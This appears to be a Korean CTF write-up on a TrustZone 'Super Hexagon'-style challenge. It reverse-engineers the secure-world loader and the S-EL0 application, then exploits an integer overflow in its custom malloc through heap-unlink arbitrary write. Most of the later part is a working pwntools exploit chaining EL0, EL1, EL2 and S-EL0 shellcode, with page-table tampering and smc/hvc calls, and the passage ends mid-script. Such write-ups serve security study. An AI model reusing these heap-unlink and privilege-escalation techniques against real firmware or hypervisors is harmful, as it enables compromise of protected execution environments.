  *(undefined4 *)(param_1 + 0x60) = 0x510e527f;
  *(undefined4 *)(param_1 + 100) = 0x9b05688c;
  *(undefined4 *)(param_1 + 0x68) = 0x1f83d9ab;
  *(undefined4 *)(param_1 + 0x6c) = 0x5be0cd19;
  return;
}
```
sha256으로 검증한다.
  
FUN_0800042e는 S-EL0를 위한 메모리를 매핑하는 것으로 보인다.
```C
undefined4 FUN_0800042e(int addr,int sz,undefined4 c10)
{
  int iVar1;
  int local_18;
  int local_14;
  
  local_18 = sz;
  local_14 = addr;
  while( true ) {
    if (local_18 == 0) {
      return 0;
    }
    iVar1 = FUN_08000684();
    if ((iVar1 == -1) || (iVar1 = FUN_080001e8(local_14,iVar1,c10), iVar1 == -1)) break;
    local_14 = local_14 + 0x1000;
    local_18 = local_18 + -0x1000;
  }
  return 0xffffffff;
}
```
뭔가 normalized size를 넘기고 address로 추정되는 값을 넘기고 있다.
FUN_080001e8 내부적으로 page table을 수정해서 VA, PA를 매핑하고 있다.
AArch32긴 한데 하위 2비트가 11인 것으로 보아 AArch64 처럼 주소 변환이 동작하는 것으로 보인다.
세 번째 인자는 페이지에 대한 속성으로 보인다.
### Reversing the binary loader & S-EL0 binary extraction
```Python
import struct
with open('./bios.bin', 'rb') as f:
    f.seek(0x00bdf10)
    buf = f.read(0x750)
with open('./SEL0.bin','wb') as f:
    f.write(buf[0x24:]) # mapping start
ext32 = lambda x : struct.unpack('<I',x)[0]
size0 = ext32(buf[0x10:0x14])
addr0 = ext32(buf[0xc:0x10])
print(hex(addr0), hex(size0))
size1 = ext32(buf[0x18:0x1c])
addr1 = ext32(buf[0x14:0x18])
print(hex(addr1), hex(size1))
size2 = ext32(buf[0x20:0x24])
addr2 = ext32(buf[0x1c:0x20])
print(hex(addr2), hex(size2))
print(hex(0xff8000), hex(0x8000))
```
```C
0x1000 0x1000 (0x684)
0x2000 0x1000 (0xa8)
0x100000 0x82000 (0x81070)
0xff8000 0x8000 (0x8000)
```
위와 같이 매핑한다.
권한은 아래와 같다.
![](attachment/a0dc084795134a2ff9940e0df33e83df.png)
0x24만큼 헤더가 짤린 SEL0.bin을 기드라에 로드해서 세그먼트 별로 잘라서 로드해주고 분석하면 된다.
다음은 tci call시 호출되는 함수다.
```C
undefined4 FUN_08000dbe(TCI *r1)
{
  undefined4 local_c;
  
  if (Entry != 0xffffffff) {
    if ((Entry & 1) == 0) {
      local_c = 0x1d0;
    }
    else {
      local_c = 0x1f0;
    }
    FUN_08001944(&ctx,0,0x3c);
    *tci_handle = r1;
    _DAT_08085040 = local_c;
    _DAT_0808503c = Entry;
    ctx.sp._0_1_ = 0xf0;
    ctx.sp._1_1_ = 0xff;
    ctx.sp._2_1_ = 0xff;
    ctx.sp._3_1_ = 0;
    FUN_0800187c();
  }
  return 0xffffffff;
}
```
sp를 세팅한다.
```Python
                             *************************************************************
                             *                           FUNCTION                          
                             *************************************************************
                             undefined  FUN_08001818 (undefined  param_1 , undefined  par
             undefined         r0:1           <RETURN>
             undefined         r0:1           param_1
             undefined         r1:1           param_2
             undefined         r2:1           param_3
             undefined         r3:1           param_4
             undefined         Stack[0x0]:1   param_5
             undefined         Stack[0x4]:1   param_6
             undefined         Stack[0x8]:1   param_7
             undefined         Stack[0xc]:1   param_8
             undefined         Stack[0x10]:1  param_9
             undefined         Stack[0x14]:1  param_10
             undefined4        Stack[0x34]:4  param_11                                XREF[1]:     08001818 (R)   
             undefined4        Stack[0x38]:4  param_12                                XREF[1]:     0800181c (R)   
                             FUN_08001818                                    XREF[1]:     FUN_080015b4:08001870 (c)   
        08001818 34  00  9d  e5    ldr        param_1 ,[sp,#param_11 ]
        0800181c 38  10  9d  e5    ldr        param_2 ,[sp,#param_12 ]
        08001820 1f  00  02  f1    cps        #31
        08001824 0d  20  a0  e1    cpy        param_3 ,sp
        08001828 00  d0  a0  e1    cpy        sp,param_1
        0800182c 01  e0  a0  e1    cpy        lr,param_2
        08001830 13  00  02  f1    cps        #19
        08001834 44  20  8d  e5    str        param_3 ,[sp,#0x44 ]
        08001838 00  00  9d  e5    ldr        param_1 ,[sp,#0x0 ]
        0800183c 04  10  9d  e5    ldr        param_2 ,[sp,#0x4 ]
        08001840 08  20  9d  e5    ldr        param_3 ,[sp,#0x8 ]
        08001844 0c  30  9d  e5    ldr        param_4 ,[sp,#0xc ]
        08001848 10  40  9d  e5    ldr        r4,[sp,#0x10 ]
        0800184c 14  50  9d  e5    ldr        r5,[sp,#0x14 ]
        08001850 18  60  9d  e5    ldr        r6,[sp,#0x18 ]
        08001854 1c  70  9d  e5    ldr        r7,[sp,#0x1c ]
        08001858 20  80  9d  e5    ldr        r8,[sp,#0x20 ]
        0800185c 24  90  9d  e5    ldr        r9,[sp,#0x24 ]
        08001860 28  a0  9d  e5    ldr        r10 ,[sp,#0x28 ]
        08001864 2c  b0  9d  e5    ldr        r11 ,[sp,#0x2c ]
        08001868 30  c0  9d  e5    ldr        r12 ,[sp,#0x30 ]
        0800186c 1e  ff  2f  e1    bx         lr
                             LAB_08001870                                    XREF[1]:     FUN_0800187c:08001888 (j)   
        08001870 e8  ff  ff  eb    bl         FUN_08001818                                     undefined FUN_08001818(undefined
        08001874 3c  e0  9d  e5    ldr        lr,[sp,#0x3c ]
        08001878 0e  f0  b0  e1    movs       pc,lr
```
hdr[0x8:12]는 0x126b로 S-EL0의 entrypoint라고 볼 수 있다.
S-EL0의 context를 복구하고 여기로 pc에 entrypoint를 넣는다.
tci handle도 특정 부분에 기록되어서 S-EL0로 넘어간다.
# S-EL0, Secure application
```C
void FUN_0000126a(void)
{
  code *UNRECOVERED_JUMPTABLE;
  
  FUN_0000122c(tci_handle);
                    /* WARNING: Could not recover jumptable at 0x00001288. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*UNRECOVERED_JUMPTABLE)();
  return;
}
```
엔트리 포인트부터 확인해보면 S-EL1에서 기록한 tci_handle을 넘겨받는 것을 확인할 수 있다.
```C
void FUN_0000122c(TCI *tci_handle_arg)
{
  code *UNRECOVERED_JUMPTABLE;
  
  interrupt_kernel(0xb,0x1001);
  if (tci_handle_arg->cmd == 2) {
                    /* load */
    FUN_0000104e(tci_handle_arg);
  }
  else if (tci_handle_arg->cmd == 3) {
                    /* store */
    FUN_000010f6(tci_handle_arg);
  }
  UNRECOVERED_JUMPTABLE = FUN_0000126a + 1;
  FUN_0000166c(0);
  FUN_0000122c(tci_handle);
                    /* WARNING: Could not recover jumptable at 0x00001288. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*UNRECOVERED_JUMPTABLE)();
  return;
}
```
내부적으로 store 함수에서 custom heap allocator를 이용한다.
software_interrupt1은 S-EL1에서 svc 뒤에 나오는 숫자를 추출해서, S-EL1의 software interrupt handler에서 호출하는 함수 포인터에 대한 대입 연산을 수행해서 user level에서의 exception handler 할당이 가능하다.
```C
void FUN_000010f6(TCI *param_1)
{
  undefined4 local_64;
  undefined4 uStack_60;
  undefined4 uStack_5c;
  undefined4 uStack_58;
  undefined4 local_54;
  undefined4 uStack_50;
  undefined4 uStack_4c;
  undefined4 uStack_48;
  undefined4 local_44;
  undefined4 uStack_40;
  undefined4 uStack_3c;
  undefined4 uStack_38;
  undefined2 local_34;
  undefined4 local_30;
  undefined4 uStack_2c;
  undefined4 uStack_28;
  undefined4 uStack_24;
  undefined4 local_20;
  undefined2 uStack_1c;
  char cStack_1a;
  uint local_18;
  uint idx;
  
  idx = param_1->index;
  if (idx < 10) {
    if (UINT_ARRAY_00100000[idx * 2 + 1] != 0) {
      free((char *)UINT_ARRAY_00100000[idx * 2 + 1]);
      UINT_ARRAY_00100000[idx * 2 + 1] = 0;
      *(undefined4 *)(idx * 8 + 0x100000) = 0;
    }
    local_18 = malloc(param_1->size);
    if (local_18 == 0) {
      local_64._0_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[0];
      local_64._1_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[1];
      local_64._2_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[2];
      local_64._3_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[3];
      uStack_60._0_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[4];
      uStack_60._1_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[5];
      uStack_60._2_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[6];
      uStack_60._3_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[7];
      uStack_5c._0_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[8];
      uStack_5c._1_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[9];
      uStack_5c._2_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[10];
      uStack_5c._3_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[11];
      uStack_58._0_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[12];
      uStack_58._1_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[13];
      uStack_58._2_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[14];
      uStack_58._3_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[15];
      local_54._0_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[16];
      local_54._1_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[17];
      local_54._2_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[18];
      local_54._3_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[19];
      uStack_50._0_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[20];
      uStack_50._1_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[21];
      uStack_50._2_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[22];
      uStack_50._3_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[23];
      uStack_4c._0_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[24];
      uStack_4c._1_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[25];
      uStack_4c._2_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[26];
      uStack_4c._3_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[27];
      uStack_48._0_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[28];
      uStack_48._1_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[29];
      uStack_48._2_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[30];
      uStack_48._3_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[31];
      local_44._0_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[32];
      local_44._1_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[33];
      local_44._2_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[34];
      local_44._3_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[35];
      uStack_40._0_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[36];
      uStack_40._1_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[37];
      uStack_40._2_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[38];
      uStack_40._3_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[39];
      uStack_3c._0_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[40];
      uStack_3c._1_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[41];
      uStack_3c._2_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[42];
      uStack_3c._3_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[43];
      uStack_38._0_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[44];
      uStack_38._1_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[45];
      uStack_38._2_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[46];
      uStack_38._3_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[47];
      local_34 = (undefined2)s_assert((ptr_=_(uint8_t_*)malloc(_00002070._48_4_;
      strcpy(param_1->data,&local_64);
      param_1->cmd = 1;
    }
    else {
      UINT_ARRAY_00100000[idx * 2 + 1] = local_18;
      *(uint *)(idx * 8 + 0x100000) = param_1->size;
      memcpy((char *)UINT_ARRAY_00100000[idx * 2 + 1],(int *)param_1->data,(int *)param_1->size);
      param_1->cmd = 0;
    }
  }
  else {
    local_30 = s_assert(index_<_DB_NUM)_00002058._0_4_;
    uStack_2c = s_assert(index_<_DB_NUM)_00002058._4_4_;
    uStack_28 = s_assert(index_<_DB_NUM)_00002058._8_4_;
    uStack_24 = s_assert(index_<_DB_NUM)_00002058._12_4_;
    local_20 = s_assert(index_<_DB_NUM)_00002058._16_4_;
    uStack_1c = (undefined2)s_assert(index_<_DB_NUM)_00002058._20_4_;
    cStack_1a = SUB41(s_assert(index_<_DB_NUM)_00002058._20_4_,2);
    strcpy(param_1->data,&local_30);
    param_1->cmd = 1;
  }
  return;
}
```
```C
uint32_t * malloc(uint sz)
{
  chunk *iVar1;
  uint size;
  freed_chunk *FD;
  freed_chunk *BK;
  uint cur_sz;
  chunk *next_chunk;
  freed_chunk *iter_chunk;
  chunk *cur_chunk;
  uint32_t *cur_sz_addr;
  
  if ((int)is_heap_initialized < 0) {
    FUN_000012c2();
  }
  cur_chunk = Arena.chunk_ptr;
                    /* size normalization */
  if (sz + 0x1f < 0x20) {
    size = 0x20;
  }
  else {
    size = sz + 0x1f & 0xfffffff0;
  }
  if (size < 0x40000) {
    for (iter_chunk = (Arena.freelist)->fd; iter_chunk != Arena.freelist;
        iter_chunk = iter_chunk->fd) {
      FD = iter_chunk->fd;
      BK = (freed_chunk *)iter_chunk->bk;
      cur_sz = iter_chunk->size & 0xfffffffc;
      if (size <= cur_sz) {
        BK->fd = FD;
        FD->bk = (uint32_t)BK;
        *(uint *)((int)&iter_chunk->size + cur_sz) = *(uint *)((int)&iter_chunk->size + cur_sz) | 1;
                    /* prev inuse bit set */
        return &iter_chunk->bk;
      }
    }
    cur_sz = (Arena.chunk_ptr)->sz & 0xfffffffc;
    if (size + 0x20 <= cur_sz) {
      next_chunk = (chunk *)((int)&(Arena.chunk_ptr)->fd_const0 + size);
      cur_sz_addr = &(Arena.chunk_ptr)->sz;
      Arena.chunk_ptr = next_chunk;
      *cur_sz_addr = size | 1;
      next_chunk->sz = cur_sz - size | 1;
      return &cur_chunk->payload;
    }
  }
  else {
    size = size + 0xfff & 0xfffff000;
    iVar1 = (chunk *)software_interrupt_2(0,size,0,0,0xffffffff,0);
    if (iVar1 != (chunk *)0xffffffff) {
      iVar1->sz = size | 2;
      return &iVar1->payload;
    }
  }
                    /* unlink */
  return (uint32_t *)0x0;
}
```
interger overflow가 발생한다.
![](attachment/4110f4f470742e21d147ea0cf3435c37.png)
aarch64 디버깅을 할 때 secure EL0를 직접적으로 디버깅은 불가능하지만 이렇게 간접적으로 메모리를 확인하는 것은 가능하다.
세 개의 청크를 할당한 모습이다.
취약점을 트리거하면 size가 너무 커져서 무조건 SIGSEGV가 나서 abort exception handler로 진입한다.
하지만 처음에 0xb에 대한 sighandler를 넘겨준적이 있다.
```C
void FUN_00001000(undefined4 param_1)
{
  TCI *pTVar1;
  undefined4 *puVar2;
  undefined4 uVar3;
  undefined4 uStack_90;
  undefined4 uStack_8c;
  undefined4 uStack_88;
  undefined4 uStack_84;
  undefined4 uStack_80;
  undefined4 uStack_7c;
  undefined4 uStack_78;
  undefined4 uStack_74;
  undefined4 uStack_70;
  undefined4 uStack_6c;
  undefined4 uStack_68;
  undefined4 uStack_64;
  char cStack_60;
  uint uStack_5c;
  undefined2 *puStack_58;
  char *pcStack_54;
  undefined *puStack_50;
  undefined4 uStack_4c;
  undefined auStack_48 [4];
  undefined4 uStack_44;
  undefined4 uStack_3c;
  undefined4 uStack_38;
  undefined4 uStack_34;
  undefined4 uStack_30;
  undefined4 uStack_2c;
  undefined4 uStack_28;
  undefined4 uStack_24;
  undefined4 uStack_20;
  undefined2 auStack_1c [2];
  TCI *pTStack_18;
  TCI *pTStack_14;
  
  pTVar1 = tci_handle;
  pTStack_14 = tci_handle;
  uStack_3c = s_Secure_DB_access_failed_(SIGSEGV_00002000._0_4_;
  uStack_38 = s_Secure_DB_access_failed_(SIGSEGV_00002000._4_4_;
  uStack_34 = s_Secure_DB_access_failed_(SIGSEGV_00002000._8_4_;
  uStack_30 = s_Secure_DB_access_failed_(SIGSEGV_00002000._12_4_;
  uStack_2c = s_Secure_DB_access_failed_(SIGSEGV_00002000._16_4_;
  uStack_28 = s_Secure_DB_access_failed_(SIGSEGV_00002000._20_4_;
  uStack_24 = s_Secure_DB_access_failed_(SIGSEGV_00002000._24_4_;
  uStack_20 = s_Secure_DB_access_failed_(SIGSEGV_00002000._28_4_;
  auStack_1c[0] = (undefined2)s_Secure_DB_access_failed_(SIGSEGV_00002000._32_4_;
  pTStack_18 = tci_handle;
  tci_handle->cmd = 1;
  uStack_44 = param_1;
  strcpy(pTVar1->data,&uStack_3c);
  uVar3 = 0x104f;
  puVar2 = (undefined4 *)FUN_0000166c(0);
  pcStack_54 = s_Secure_DB_access_failed_(SIGSEGV_00002000 + 0x20;
  ...
```
다시 원래 context로 복원하여 계속 실행되는 특징이 있다.
![](attachment/a0dc084795134a2ff9940e0df33e83df.png)
전에 직접 제작한 secure world에서의 pagewalk 결과를 보면, 매핑 자체가 PL0에서 RWX 임을 알 수 있다.
다음과 같은 malloc 내부 로직을 이용하여 4 bytes aaw를 달성한다.
```C
      ...
      FD = iter_chunk->fd;
      BK = (freed_chunk *)iter_chunk->bk;
      cur_sz = iter_chunk->size & 0xfffffffc;
      if (size <= cur_sz) {
        BK->fd = FD;
        FD->bk = (uint32_t)BK;
        *(uint *)((int)&iter_chunk->size + cur_sz) = *(uint *)((int)&iter_chunk->size + cur_sz) | 1;
                    /* prev inuse bit set */
        return &iter_chunk->bk;
      ...
```
Arena.chunk_ptr을 변조하면 SEL0의 code segment에 대한 청크 할당이 가능해진다.
이를 이용해 SEL0의 엔트리를 변조해서 임의 쉘코드 실행을 달성한다.
  
내부적으로 이미 할당된 청크에 대해서는 free이후 다시 할당해서 reclaim이 가능하다.
![](attachment/f512d95c57426d767060cf08fcf02c4b.png)
freelist에 역순으로 size 더 크게해서 chunk free하고 취약점을 트리거해서 다음과 같이 메타데이터를 덮었다.
이후 Arena 구조체의 entry를 4 bytes aaw primitive를 이용해 덮고, freelist에 적합한 size를 초과한 크기를 할당하면 원하는 S-EL0의 .text 영역에 read/write가 가능해진다.
  
exploit 전략은 다음과 같다.
1) chunk 2 1 0 free.
2) chunk 0 reclaim → heap overflow.
3) chunk 1 할당, 0x100050 fd,bk 작성해서 freelist 순회 끊키 → unlink aaw Arena.chunk_ptr overwrite → .text.
4) size를 0x300 정도로 설정해서 next chunk에 write 연산 sigsegv 방지, 돌고 있는 memcpy 코드 수정 방지 & 할당된 청크에 쉘 코드 작성.
5) 시스템 레지스터를 읽고 world shared memory에 flag write하고 software interrupt 0를 발생시켜 normal world로 복귀해서 플래그 출력.
취약점 자체는 간단해서 금방 찾았는데 malloc 내부 로직에서 자꾸 꼬여서 익스가 힘들었다.
![](attachment/a096b3c429e31b14826b3bcfb3af9a84.png)
## Exploit code (code execution & flag)
```Python
from pwn import *
from keystone import *
sla = lambda x,y : p.sendlineafter(x,y)
sa = lambda x,y : p.sendafter(x,y)
context.binary = e = ELF('./super_hexagon/share/_bios.bin.extracted/BC010')
ks = Ks(KS_ARCH_ARM64,KS_MODE_LITTLE_ENDIAN)
sc_st = 0x7ffeffffd006
shellcode = b''
shellcode += bytes(ks.asm(f'''\
    mov x5, #-1
    mov w4, #0x0
    mov w3, #0x0
    mov w2, #3
    mov x1, #0x1000
    mov x0, #0x0
    mov x8, #0xde
    svc #0x1337
    mov x11, x0
    mov w9, #0x0
    loop:                   
        add x1, x11, x9
        mov x8, #0x3f
        mov x0, #0
        mov x2, #0x1
        svc #0x1337
        add w9, w9, #1
        cmp x9, #0x1000
        bne loop
    mov x0, x11
    mov x1, #0x1000
    mov x2, #5
    mov x8, #0xe2
    svc #0x1337
    blr x11
''')[0])
assert b'\r' not in shellcode and b'\x0a' not in shellcode
# p = remote('localhost',6666)
p = process('./local_debug.sh')
# p = process('./local_debug_secure.sh')
payload = b'A' * 0x100
payload += p64(0xdeadbeef) 
payload += p64(e.sym.gets) # cmd = 1
sla(b'cmd> ', b'1')
sla(b'index: ', str(0))
sla(b'key: ', payload)
sleep(0.1)
payload = b'A' * 0b101 + b'\x00'
payload += shellcode
p.sendline(payload)
sla(b'cmd> ', b'1')
sla(b'index: ', str(0x1000))
payload = b''
payload += b'A'*0b101 + b'\x00'
payload += b'A'*(0x100 - len(payload))
payload += p64(0xdeadbeef)
payload += p64(e.sym.mprotect)
payload += p64(sc_st)
sla(b'key: ', payload)
sla(b'cmd> ',b'2')
sla(b'index: ', str(1))
sleep(0.1)
WORLD_SHARED_MEM_VA = 0x023fe000
WORLD_SHARED_MEM_PA = 0x40033000
TCI_Data_addr = 0x4010225c
SEL0_shellcode = b"\x00\xf0\x08\xe8" # thumb switch
SEL0_shellcode += b'A'*0x10
SEL0_shellcode += asm('mov r0, sp',arch='arm')
SEL0_shellcode += asm(f'''\
    mrc p15, 3, r1, c15, c12, 0
    str r1, [r0]
    mrc p15, 3, r1, c15, c12, 1
    str r1, [r0, #0x4]
    mrc p15, 3, r1, c15, c12, 2
    str r1, [r0, #0x8]
    mrc p15, 3, r1, c15, c12, 3
    str r1, [r0, #0xc]
    mrc p15, 3, r1, c15, c12, 4
    str r1, [r0, #0x10]
    mrc p15, 3, r1, c15, c12, 5
    str r1, [r0, #0x14]
    mrc p15, 3, r1, c15, c12, 6
    str r1, [r0, #0x18]
    mrc p15, 3, r1, c15, c12, 7
    str r1, [r0, #0x1c]
    mov r11, #{(WORLD_SHARED_MEM_VA >> 16)&0xffff} // SHARED MEM
    lsl r11, r11, #16
    orr r11, r11, #{WORLD_SHARED_MEM_VA&0xffff} // SHARED MEM
    mov r0, #1
    strb r0, [r11]
    add r11, r11, #0xc
    mov r9, #0
    loop:
        add r0, sp, r9 
        add r1, r11, r9
        ldrb r0, [r0]
        strb r0, [r1]
        add r9, r9, #1
        cmp r9, #32
        bne loop
    svc 0x0
''',arch='arm')
SEL0_shellcode_src = 0x40035500
UART= 0x0000000009000000
read_flag = [1, 252, 59, 213, 1, 0, 0, 185, 33, 252, 59, 213, 1, 4, 0, 185, 65, 252, 59, 213, 1, 8, 0, 185, 97, 252, 59, 213, 1, 12, 0, 185, 129, 252, 59, 213, 1, 16, 0, 185, 161, 252, 59, 213, 1, 20, 0, 185, 193, 252, 59, 213, 1, 24, 0, 185, 225, 252, 59, 213, 1, 28, 0, 185]
TCI_Data = b''
TCI_Data += p32(0xdeadbeef) * 8 + p32(0xdeadbeef) * 2 
TCI_Data += p32(0) + p32(0x31) + p32(0x00000000e4990b0-8) + p32(0x0) + p32(0) + p32(0) + b'A' * 0x18# chunk 1
TCI_Data += p32(0) + p32(0x31) + p32(0x00122c-0x10) + p32(0x0100060-0x8) + b'B' * 0x14 # chunk 2
EL2_shellcode = asm(f'''\
    movz x11, #{((UART)>>48)&0xffff}, lsl #48
    movk x11, #{((UART)>>32)&0xffff}, lsl #32
    movk x11, #{((UART)>>16)&0xffff}, lsl #16
    movk x11, #{(UART)&0xffff}, lsl #0
    mov x0, sp
''') + bytes(read_flag) + asm(f'''\
    mov x9, #0
    loop:
        add x0, sp, x9 
        ldrb w0, [x0]
        strb w0, [x11]
        add x9, x9, #1
        cmp x9, #32
        bne loop
    movz x10, #{((WORLD_SHARED_MEM_VA)>>48)&0xffff}, lsl #48
    movk x10, #{((WORLD_SHARED_MEM_VA)>>32)&0xffff}, lsl #32
    movk x10, #{((WORLD_SHARED_MEM_VA)>>16)&0xffff}, lsl #16
    movk x10, #{(WORLD_SHARED_MEM_VA)&0xffff}, lsl #0
    movz x9, #{((WORLD_SHARED_MEM_PA)>>48)&0xffff}, lsl #48
    movk x9, #{((WORLD_SHARED_MEM_PA)>>32)&0xffff}, lsl #32
    movk x9, #{((WORLD_SHARED_MEM_PA)>>16)&0xffff}, lsl #16
    movk x9, #{(WORLD_SHARED_MEM_PA)&0xffff}, lsl #0
    movz x20, #{((SEL0_shellcode_src)>>48)&0xffff}, lsl #48
    movk x20, #{((SEL0_shellcode_src)>>32)&0xffff}, lsl #32
    movk x20, #{((SEL0_shellcode_src)>>16)&0xffff}, lsl #16
    movk x20, #{(SEL0_shellcode_src)&0xffff}, lsl #0
    add x21, x9, #0xc // shellcode_dst, TCI buf payload

    mov x25, #0
    alloc_loop:
        // alloc(i, 0x20, b'')
        mov w2, #3
        str w2, [x9] // cmd
        mov w2, w25
        str w2, [x9, #4] // idx
        movz w2, #0x0000, lsl 16
        movk w2, #0x20, lsl 0
        str w2, [x9, #8] // sz
        movz x0, #0x8300, lsl 16          
        movk x0, #0x06, lsl 0
        mov x1, x10
        smc #0x1337
        add x25, x25, #1
        cmp x25, #{3}
        bne alloc_loop
    mov x25, #2
    free_loop:
        // free 2, 1, 0
        mov w2, #3
        str w2, [x9] // cmd
        mov w2, w25
        str w2, [x9, #4] // idx
        movz w2, #0x0000, lsl 16
        movk w2, #0x40, lsl 0
        str w2, [x9, #8] // sz
        movz x0, #0x8300, lsl 16          
        movk x0, #0x06, lsl 0
        mov x1, x10
        smc #0x1337
        cmp x25, #{0}
        sub x25, x25, #1
        bne free_loop
    //trigger the vuln
    mov w2, #3
    str w2, [x9] // cmd
    mov w2, #0
    str w2, [x9, #4] // idx
    movz w2, #0xffff, lsl 16
    movk w2, #0xffff, lsl 0
    str w2, [x9, #8] // sz
    movz x22, #{((TCI_Data_addr)>>48)&0xffff}, lsl #48
    movk x22, #{((TCI_Data_addr)>>32)&0xffff}, lsl #32
    movk x22, #{((TCI_Data_addr)>>16)&0xffff}, lsl #16
    movk x22, #{(TCI_Data_addr)&0xffff}, lsl #0
    mov x8, #0x0 
    loop_tci:                  
        add x2, x21, x8 // dst
        add x1, x22, x8 // src
        ldrb w0, [x1]
        strb w0, [x2]
        add x8, x8, #1
        cmp x8, #{len(TCI_Data)}
        bne loop_tci
    movz x0, #0x8300, lsl 16          
    movk x0, #0x06, lsl 0
    mov x1, x10
    smc #0x1337
    // unlink AAW trigger
    mov w2, #3
    str w2, [x9] // cmd
    mov w2, #4
    str w2, [x9, #4] // idx
    movz w2, #0x0000, lsl 16
    movk w2, #0x20, lsl 0
    str w2, [x9, #8] // sz
    movz w2, 0x0010, lsl #16
    movk w2, 0x0050, lsl #0
    str w2, [x9, #16] // data + 4
    str w2, [x9, #20] // this is needed to get out of the freelist loop.
    
    movz x0, #0x8300, lsl 16          
    movk x0, #0x06, lsl 0
    mov x1, x10
    smc #0x1337
    // get .text
    mov w2, #3
    str w2, [x9] // cmd
    mov w2, #5
    str w2, [x9, #4] // idx
    movz w2, #0x0000, lsl 16
    movk w2, #0x0300, lsl 0
    str w2, [x9, #8] // sz
    mov x8, #0x0 
    loop_copy:                  
        add x2, x21, x8
        add x1, x20, x8
        ldrb w0, [x1]
        strb w0, [x2]
        add x8, x8, #1
        cmp x8, #{len(SEL0_shellcode)}
        bne loop_copy
    movz x0, #0x8300, lsl 16          
    movk x0, #0x06, lsl 0
    mov x1, x10
    smc #0x1337
    mov x8, #0x0 
    loop_print_flag_sel0:                  
        add x1, x21, x8 // dst
        ldrb w0, [x1]
        strb w0, [x11]
        add x8, x8, #1
        cmp x8, #{0x20}
        bne loop_print_flag_sel0
''') 
EL2_shellcode +=  b'A' * (0x250- len(EL2_shellcode)) + TCI_Data

EL2_shellcode = b'\x41'*0xc+EL2_shellcode
entry = 0xffffffffc001e000 + 0xf0 
addr = 0xffffffffc00091b8
IPA = 0x2400 | (0b11<<6) # s2ap 11
DESC = 3 | 0x100000
EL2_TEXT = 0x00007ffeffffa000
entry_user = 0xffffffffc0028000 + 0xfd0
user_val = 0x2403 | 64 | 0x0020000000000000# ap 01
EL2_shellcode_addr = 0x7ffeffffc100
EL1_shellcode = asm(f'nop')*(0x400//4)
EL1_shellcode += asm(f'''\
    mov x0, #1 
    movz x1, #{((IPA)>>48)&0xffff}, lsl #48
    movk x1, #{((IPA)>>32)&0xffff}, lsl #32
    movk x1, #{((IPA)>>16)&0xffff}, lsl #16
    movk x1, #{(IPA)&0xffff}, lsl #0
    movz x2, #{((DESC)>>48)&0xffff}, lsl #48
    movk x2, #{((DESC)>>32)&0xffff}, lsl #32
    movk x2, #{((DESC)>>16)&0xffff}, lsl #16
    movk x2, #{(DESC)&0xffff}, lsl #0
    hvc #0x1337 // PA 0x0000000040102000 RWX
    movz x11, #{((entry_user)>>48)&0xffff}, lsl #48
    movk x11, #{((entry_user)>>32)&0xffff}, lsl #32
    movk x11, #{((entry_user)>>16)&0xffff}, lsl #16
    movk x11, #{(entry_user)&0xffff}, lsl #0
    movz x10, #{((user_val)>>48)&0xffff}, lsl #48
    movk x10, #{((user_val)>>32)&0xffff}, lsl #32
    movk x10, #{((user_val)>>16)&0xffff}, lsl #16
    movk x10, #{(user_val)&0xffff}, lsl #0
    str x10, [x11] // IPA 0x0000000000002000 RW
    movz x11, #{((EL2_TEXT)>>48)&0xffff}, lsl #48
    movk x11, #{((EL2_TEXT)>>32)&0xffff}, lsl #32
    movk x11, #{((EL2_TEXT)>>16)&0xffff}, lsl #16
    movk x11, #{(EL2_TEXT)&0xffff}, lsl #0
    movz x12, #{((EL2_shellcode_addr)>>48)&0xffff}, lsl #48
